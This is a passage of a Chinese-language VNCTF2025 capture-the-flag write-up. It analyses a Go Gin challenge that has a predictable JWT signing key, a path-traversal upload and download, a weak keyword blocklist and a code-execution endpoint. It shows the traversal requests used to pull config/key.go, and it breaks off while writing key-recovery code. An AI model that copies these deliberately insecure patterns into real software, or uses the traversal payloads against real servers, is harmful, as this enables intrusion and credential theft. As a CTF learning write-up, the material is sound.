class="line">	<span class="string">&quot;GinTest/config&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/golang-jwt/jwt/v4&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> JWTClaims <span class="keyword">struct</span> &#123;</span><br><span class="line">	Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">	jwt.RegisteredClaims</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	rand.Seed(config.Year())</span><br><span class="line">	randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">	key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateToken</span><span class="params">(username <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	key := GenerateKey()</span><br><span class="line">	claims := JWTClaims&#123;</span><br><span class="line">		Username: username,</span><br><span class="line">		RegisteredClaims: jwt.RegisteredClaims&#123;</span><br><span class="line">			ExpiresAt: jwt.NewNumericDate(time.Now().Add(<span class="number">24</span> * time.Hour)),</span><br><span class="line">			IssuedAt:  jwt.NewNumericDate(time.Now()),</span><br><span class="line">			Issuer:    <span class="string">&quot;Mash1r0&quot;</span>,</span><br><span class="line">			Subject:   <span class="string">&quot;user token&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line"></span><br><span class="line">	signedToken, err := token.SignedString([]<span class="type">byte</span>(key))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;生成 token 时出错: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> signedToken, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ParseToken</span><span class="params">(tokenString <span class="type">string</span>)</span></span> (*JWTClaims, <span class="type">error</span>) &#123;</span><br><span class="line">	key := GenerateKey()</span><br><span class="line">	token, err := jwt.ParseWithClaims(tokenString, &amp;JWTClaims&#123;&#125;, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> []<span class="type">byte</span>(key), <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;解析 token 时出错: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> claims, ok := token.Claims.(*JWTClaims); ok &amp;&amp; token.Valid &#123;</span><br><span class="line">		<span class="keyword">return</span> claims, <span class="literal">nil</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;无效的 token&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看看控制器，如果有权限的话能干嘛</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controllers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;GinTest/config&quot;</span></span><br><span class="line">	<span class="string">&quot;GinTest/model&quot;</span></span><br><span class="line">	<span class="string">&quot;GinTest/response&quot;</span></span><br><span class="line">	<span class="string">&quot;GinTest/utils&quot;</span></span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/crypto/bcrypt&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DB = config.InitDB()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> requestUser = model.User&#123;&#125;</span><br><span class="line">	c.Bind(&amp;requestUser)</span><br><span class="line">	username := requestUser.Username</span><br><span class="line">	password := requestUser.Password</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(username) == <span class="number">0</span> || <span class="built_in">len</span>(password) == <span class="number">0</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;账号或密码不能为空&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(password) &lt; <span class="number">6</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;密码不能小于6位&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isUserExist(DB, username) &#123;</span><br><span class="line">		response.Response(c, http.StatusConflict, <span class="number">409</span>, <span class="literal">nil</span>, <span class="string">&quot;用户已存在&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hashedPassword, err := bcrypt.GenerateFromPassword([]<span class="type">byte</span>(password), bcrypt.DefaultCost)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;加密错误&quot;</span>)</span><br><span class="line">		log.Printf(<span class="string">&quot;password hashing failed: %v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	newUser := model.User&#123;</span><br><span class="line">		Username: username,</span><br><span class="line">		Password: <span class="type">string</span>(hashedPassword),</span><br><span class="line">	&#125;</span><br><span class="line">	DB.Create(&amp;newUser)</span><br><span class="line">	response.Success(c, <span class="literal">nil</span>, <span class="string">&quot;注册成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isUserExist</span><span class="params">(db *gorm.DB, username <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	user := model.User&#123;&#125;</span><br><span class="line">	db.Where(<span class="string">&quot;username = ?&quot;</span>, username).First(&amp;user)</span><br><span class="line">	<span class="keyword">if</span> user.ID != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> requestUser = model.User&#123;&#125;</span><br><span class="line">	c.Bind(&amp;requestUser)</span><br><span class="line">	username := requestUser.Username</span><br><span class="line">	password := requestUser.Password</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(username) == <span class="number">0</span> || <span class="built_in">len</span>(password) == <span class="number">0</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;账号或密码不能为空&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(password) &lt; <span class="number">6</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;密码不能小于6位&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	user := model.User&#123;&#125;</span><br><span class="line">	DB.Where(<span class="string">&quot;username = ?&quot;</span>, username).First(&amp;user)</span><br><span class="line">	<span class="keyword">if</span> user.ID == <span class="number">0</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusNotFound, <span class="number">404</span>, <span class="literal">nil</span>, <span class="string">&quot;用户不存在&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := bcrypt.CompareHashAndPassword([]<span class="type">byte</span>(user.Password), []<span class="type">byte</span>(password)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusUnauthorized, <span class="number">401</span>, <span class="literal">nil</span>, <span class="string">&quot;密码错误&quot;</span>)</span><br><span class="line">		log.Printf(<span class="string">&quot;密码错误：%v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token, err := utils.GenerateToken(user.Username)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;加密错误&quot;</span>)</span><br><span class="line">		log.Printf(<span class="string">&quot;token generate error: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	response.Success(c, gin.H&#123;<span class="string">&quot;token&quot;</span>: token&#125;, <span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	file, _ := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	contentDisposition := file.Header[<span class="string">&quot;Content-Disposition&quot;</span>][<span class="number">0</span>]</span><br><span class="line">	filename := parseFilenameFromContentDisposition(contentDisposition)</span><br><span class="line">	<span class="keyword">if</span> filename == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Failed to parse filename from Content-Disposition&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	in, _ := file.Open()</span><br><span class="line">	log.Println(in)</span><br><span class="line">	<span class="keyword">defer</span> in.Close()</span><br><span class="line">	hasMaliciousContent, err := containsMaliciousContent(in)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error checking file content&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> hasMaliciousContent &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;File contains malicious content&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	in.Seek(<span class="number">0</span>, io.SeekStart)</span><br><span class="line">	basepath := <span class="string">&quot;./uploads&quot;</span></span><br><span class="line">	filepath, _ := url.JoinPath(basepath, filename)</span><br><span class="line">	out, _ := os.Create(filepath)</span><br><span class="line">	<span class="keyword">defer</span> out.Close()</span><br><span class="line">	log.Println(in)</span><br><span class="line">	io.Copy(out, in)</span><br><span class="line">	log.Println(out)</span><br><span class="line">	log.Println(filepath)</span><br><span class="line">	downloadLink := <span class="string">&quot;/download?filename=&quot;</span> + filename</span><br><span class="line">	response.Success(c, gin.H&#123;<span class="string">&quot;filepath&quot;</span>: filepath, <span class="string">&quot;downloadLink&quot;</span>: downloadLink&#125;, <span class="string">&quot;upload success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseFilenameFromContentDisposition</span><span class="params">(contentDisposition <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	parts := strings.Split(contentDisposition, <span class="string">&quot;;&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> _, part := <span class="keyword">range</span> parts &#123;</span><br><span class="line">		part = strings.TrimSpace(part)</span><br><span class="line">		<span class="keyword">if</span> strings.HasPrefix(part, <span class="string">&quot;filename=&quot;</span>) &#123;</span><br><span class="line">			filename := strings.TrimPrefix(part, <span class="string">&quot;filename=&quot;</span>)</span><br><span class="line">			filename = strings.Trim(filename, <span class="string">`&quot;`</span>) </span><br><span class="line">			<span class="keyword">return</span> filename</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">containsMaliciousContent</span><span class="params">(file multipart.File)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	maliciousPatterns := []<span class="type">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;package&quot;</span>,</span><br><span class="line">		<span class="string">&quot;&lt;script&gt;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;eval(&quot;</span>,</span><br><span class="line">		<span class="string">&quot;base64&quot;</span>,</span><br><span class="line">		<span class="string">&quot;file://&quot;</span>,</span><br><span class="line">		<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">		<span class="string">&quot;flag&quot;</span>,</span><br><span class="line">		<span class="string">&quot;cat&quot;</span>,</span><br><span class="line">		<span class="string">&quot;bash&quot;</span>,</span><br><span class="line">		<span class="string">&quot;/bin&quot;</span>,</span><br><span class="line">		<span class="string">&quot;import&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reader := bufio.NewReader(file)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		line, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> _, pattern := <span class="keyword">range</span> maliciousPatterns &#123;</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(line, pattern) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Download</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	filename := c.DefaultQuery(<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> filename == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Filename is required&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	basepath := <span class="string">&quot;./uploads&quot;</span></span><br><span class="line">	filepath, _ := url.JoinPath(basepath, filename)</span><br><span class="line">	<span class="keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">404</span>, <span class="literal">nil</span>, <span class="string">&quot;File not found&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Header(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span>+filename)</span><br><span class="line">	c.File(filepath)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	code := c.PostForm(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">	log.Println(code)</span><br><span class="line">	<span class="keyword">if</span> code == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;No code provided&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(containsBannedPackages(code))</span><br><span class="line">	<span class="keyword">if</span> containsBannedPackages(code) &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Code contains banned packages&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	tmpFile, err := ioutil.TempFile(<span class="string">&quot;&quot;</span>, <span class="string">&quot;goeval-*.go&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Error creating temp file:&quot;</span>, err)</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error creating temporary file&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> os.Remove(tmpFile.Name())</span><br><span class="line"></span><br><span class="line">	_, err = tmpFile.WriteString(code)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Error writing code to temp file:&quot;</span>, err)</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error writing code to temp file&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;run&quot;</span>, tmpFile.Name())</span><br><span class="line">	output, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Error running Go code:&quot;</span>, err)</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;Error executing code&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	response.Success(c, gin.H&#123;<span class="string">&quot;result&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">containsBannedPackages</span><span class="params">(code <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	importRegex := <span class="string">`(?i)import\s*\((?s:.*?)\)`</span></span><br><span class="line">	re := regexp.MustCompile(importRegex)</span><br><span class="line">	matches := re.FindStringSubmatch(code)</span><br><span class="line">	imports := matches[<span class="number">0</span>]</span><br><span class="line">	log.Println(imports)</span><br><span class="line">	<span class="keyword">if</span> strings.Contains(imports, <span class="string">&quot;os/exec&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么有思路了，但是jwt的key这里就给我卡着了，去网页测测看看有没有东西，发现文件上传的地方可以目录穿梭</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-173258.jpg" alt="1"></p>
<p>并且在<code>/download</code>路由也可以进行类似的目录遍历来下载文件，只不过文件名是被处理过的，仔细看这里的路径处理</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250208-174102.jpg" alt="1"></p>
<p>直接对路径进行了拼接，所以我们可以大胆尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/download?filename=../main.go</span><br><span class="line">/download?filename=../config/key.go</span><br></pre></td></tr></table></figure>

<p>“震惊”，下载到了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Key</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;r00t32l&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Year</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2025</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后把密钥拿到</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Key</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;r00t32l&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span 